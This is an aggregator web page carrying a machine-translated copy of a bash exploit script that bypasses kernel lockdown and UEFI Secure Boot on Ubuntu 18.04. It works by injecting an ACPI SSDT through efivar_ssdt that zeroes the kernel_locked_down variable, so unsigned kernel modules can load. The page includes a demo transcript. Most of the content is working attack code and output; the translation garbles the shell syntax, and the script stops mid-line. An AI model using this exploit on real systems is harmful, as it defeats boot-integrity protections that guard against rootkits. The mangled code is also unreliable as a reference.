<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>使用ACPI SSDT注入绕过Ubuntu 18.04上的内核锁定/UEFI安全引导</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">使用ACPI SSDT注入绕过Ubuntu 18.04上的内核锁定/UEFI安全引导</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-06-15 16:11:46</div><div class="page_narrow text-break page_content"><p>blob：4822f881ea2919a10c3e75018da51c41e38ef07d(普通)#！/bin/bash#美国未签名语言#=#by zx2c4,2020-06-13##此漏洞利用efivar_ssdt入口点将#ACPI表插入到Ubuntu Bio中。其结果是，用户可以随后将#未签名内核驱动程序加载到启用了安全引导的系统中，而不需要#对模块签名。##efivar_ssdt指向EFI变量的名称，枚举该变量的所有GUID&#d#版本，然后将内容作为ACPI表加载。#为了使其有用，我们必须创建一个要加载的ASL文件，#该文件的有效负载可以将零写入KERNEL_LOCKED_DOWN#变量。请注意，由于我们是通过物理地址访问此内容，#各种缓解措施和可分页权限都不会对此进行限制。另外，#此方法通常在内核初始化期间执行。为了找出#一个稳定的物理地址在重启后仍然有效，我们只需禁用kaslr，这样我们就可以在所有引导上保持相同的SSDT，从而持久利用漏洞。##使用\_SB_.GSIF._STA方法，因为以这种方式加载的SSDT不能#覆盖DSDT方法，但可以添加新的方法，并且在使用#开发此方法的QEMU平台上，没有定义\_SB_.GSIF._STA，即使内核是#评估它。根据您的平台，您可能希望使用不同的#方法。##问候乔诺。##演示时间：##1)首先显示我们正在运行的内核：##zx2c4@bionicman：~$uname-a#Linux bionicman 4.15.0-106-Generic#107-Ubuntu SMP清华Jun 4 11：27：52 UTC 2020 x86_64 GNU/Linux##2)观察我们可以&#39；t加载未签名的WireGuard：##zx2c4@bionicman：~。：必需密钥不可用##3)运行漏洞攻击，其第一阶段禁用kaslr：##zx2c4@bionicman：~$./american-unsign-language.sh#[+]将内核cmdline变量添加到GRUB#源文件`/etc/default/GRUB&#39；#正在生成GRUB配置文件.#找到Linux映像：/boot/vmlinuz-4.15.0-106-Generic#find initrd image：/boot/initrd.img-4.15.0-106-Generic#为EFI固件配置添加引导菜单项#完成#[+]重新启动计算机，然后再次运行此程序。#zx2c4@bionicman：~$sudo reboot##4)计算机重启后，我们计算地址并创建SSDT：##zx2c4@bionicman：~$./american-unsign-language.sh#[+]解析内核符号#*kernel_lock_down=0xffffffff821c6c98#[+]将虚拟地址映射到物理地址#*kernel base=0x1800000#*kernel_lock_down=0x29c6c98#[+]构造ASL#[+]为ASL#*GUID分配GUID。GRUB#源文件`/etc/default/GRUB&#39；#正在生成GRUB配置文件.#找到Linux映像：/boot/vmlinuz-4.15.0-106-Generic#找到initrd映像：/boot/initrd.img-4.15.0-106-Generic#为EFI固件配置添加引导菜单项#完成#[+]成功。重新启动以激活。#zx2c4@bionicman：~$sudo reboot##5)计算机重新启动后，我们现在可以开始工作了，内核锁定#被永久禁用：##zx2c4@bionicman：~$sudo modprobe wireguard#zx2c4@bionicman：~$dmesg|grep wireGuard#[40.574623]wireguard：wireGuard 1.0.20200611已加载。有关信息，请访问www.wireguard.com。set-e self=&#34；$(readlink-f&#34；${BASH_SOURCE[0]}&#34；)&#34；[[$UID==0]]||exec sudo--&#34；$BASH&#34；--&#34；$Self&#34；&#34；$@&#34；ECHO&#34；=。echo&#34；=&#34；如果[[！-d/boot/efi]]；则echo&#34；[+]挂载/引导分区&#34；mount/boot fi if[[$(&lt；/proc/cmdline)！=*nokaslr*]]；则if！grep-F-q nokaslr/etc/Default/GRUB；然后ECHO&#34；[+]将内核命令行变量添加到GRUB&#34；ECHO&#39；GRUB_CMDLINE_LINUX_DEFAULT=&#34；$GRUB_CMDLINE_LINUX_DEFAULT nokaslr&#34；&#39；&gt；&gt；/etc/DEFAULT/GRUB UPDATE-GRUB FI ECHO&#34；[+]重新启动计算机，然后再次运行此程序。&#34；如果！则退出0 FI！命令-v iasl&&gt;&gt;/dev/null 2；&gt;&gt;&amp；1；然后echo&#34；[+]安装依赖项&#34；apt-get install-y acpica-tools fi echo&#34；[+]解析内核符号&#34；read-r addr类型符号&lt；&lt；(grep-F kernel_lock_down/proc/kallsyms)[[$Symbol==kernel_lock_down]]addr=。*KERNEL_LOCKED_DOWN=0x%x\n&#39；&#34；$addr&#34；echo&#34；[+]将虚拟地址映射到物理地址&#34；addr=$(($addr&amp；~0xffffffff80000000))读r行时；do[[$line=~([0-9a-f]+)-[0-9a-f]+\：\kernel\code]|继续偏移</p></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://git.zx2c4.com/american-unsigned-language/tree/american-unsigned-language.sh">https://git.zx2c4.com/american-unsigned-language/tree/american-unsigned-language.sh</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/ubuntu/">#ubuntu</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/安全/">#安全</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/ssdt/">#ssdt</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/内核/">#内核</a></button></div></div><div class="shadow p-3 mb-5 bg-white rounded clearfix"><div class="container"><div class="row"><div class="col-sm"><div><a target="_blank" href="/story/1006067.html"><img src="http://img.diglog.com/img/2020/6/thumb_e95245e63190185494f939bf311171e6.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1006067.html">“Ubuntu认证”设备背后的人员和流程</a></div><span class="my_story_list_date">2020-6-11 6:46</span></div><div class="col-sm"><div><a target="_blank" href="/story/1005459.html"><img src="http://img.diglog.com/img/2020/6/thumb_893f3f60b780b7362c380e5486b49e78.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1005459.html">联想将在其所有工作站上预装Ubuntu和Red Hat</a></div><span class="my_story_list_date">2020-6-6 23:40</span></div><div class="col-sm"><div><a target="_blank" href="/story/1005443.html"><img src="http://img.diglog.com/img/2020/6/thumb_9cf943048d4392b45355e4cbd980ad1c.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1005443.html">为什么快照是Ubuntu上的反模式</a></div><span class="my_story_list_date">2020-6-6 22:29</span></div><div class="col-sm"><div><a target="_blank" href="/story/1005350.html"><img src="http://img.diglog.com/img/2020/6/thumb_26b657437a0c3a52f1d1ecc8de489545.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1005350.html">Linux Mint转储Ubuntu Snap</a></div><span class="my_story_list_date">2020-6-6 5:2</span></div></div></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/app/">#app</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/病毒/">#病毒</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/冠状病毒/">#冠状病毒</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/linux/">#linux</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/谷歌/">#谷歌</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>